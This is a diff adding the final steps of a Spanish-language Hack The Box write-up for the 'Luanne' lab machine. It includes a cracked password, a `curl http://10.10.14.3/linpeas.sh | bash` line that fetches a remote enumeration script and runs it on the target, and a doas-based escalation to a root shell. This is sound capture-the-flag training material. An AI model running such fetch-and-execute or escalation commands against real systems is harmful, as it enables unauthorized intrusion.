@@ -190,4 +190,29 @@ De nuevo me lo copio a un fichero local y lo crackeo con john.
 
 ![](/assets/images/Luanne-Hackthebox/hash2.png)
 
+La contraseña es littlebear
 
+Lo siguiente será ejecutar el script Linpeas.sh para ver posibles vectores de
+ataque para la escalada de privilegios.
+
+Me copio el fichero linpeas.sh a mi direcotrio actual y ejecuto un servidor
+http con python para compartir el fichero.
+
+`sudo python3 -m http.server 80`
+
+Y después desde la máquina Luanne ejecuto `curl http://10.10.14.3/linpeas.sh
+| bash` para que se ejecute.
+
+Me devuelve un error porque la máquina no tiene bash, así que lo pipeo con sh
+en vez de bash y esta vez si funciona.
+
+Linpeas muestra que el usuario r.michaels puede ejecutar cualquier comando como
+root en el fichero /etc/doas.conf
+
+![](/assets/images/Luanne-Hackthebox/doas.conf.png)
+
+Antes habíamos obtenido la contraseña littlebear, así que pruebo si es la del
+usuario r.michaels con `doas sh` y funciona. Ya tengo una shell de root y puedo
+leer el root.txt.
+
+![](/assets/images/Luanne-Hackthebox/root.png)
